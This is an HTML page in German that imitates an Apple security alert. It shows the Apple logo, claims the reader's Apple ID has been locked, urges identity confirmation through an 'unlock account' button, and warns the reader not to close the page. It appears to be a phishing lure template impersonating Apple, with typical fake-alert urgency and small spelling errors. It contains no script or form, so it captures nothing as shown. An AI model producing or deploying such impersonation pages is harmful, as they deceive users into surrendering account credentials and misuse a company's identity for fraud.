<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Apple ID gesperrt</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #000;
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .logo {
      width: 100px;
      margin-bottom: 20px;
    }
    .popup {
      background-color: #111;
      border-radius: 20px;
      padding: 20px;
      width: 90%;
      max-width: 400px;
      text-align: center;
    }
    .title {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 10px;
    }
    .message {
      font-size: 15px;
      margin-bottom: 20px;
    }
    .button {
      background-color: #222;
      color: #fff;
      padding: 10px;
      border-radius: 10px;
      margin: 10px 0;
      cursor: pointer;
      border: 1px solid #333;
    }
    .button:hover {
      background-color: #333;
    }
    .note {
      font-size: 13px;
      margin-top: 30px;
      padding: 0 20px;
      text-align: center;
      line-height: 1.4;
    }
  </style>
</head>
<body>
  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo">
  <div class="popup">
    <div class="title">Apple-ID gesperrt</div>
    <div class="message">Deine Apple-ID wurde aus Sicherheitsgründen gesperrt. Bitte bestätige deine Identität, um sie zu entsperren.</div>
    <div class="button">Account entsperren</div>
    <div class="button">Abbrechen</div>
  </div>
  <div class="note">
    Dein Apple-Account ist in Gefahr. Bitte beachte wichtiege Informationen und schließe diese seite nicht.
  </div>
</body>
</html>
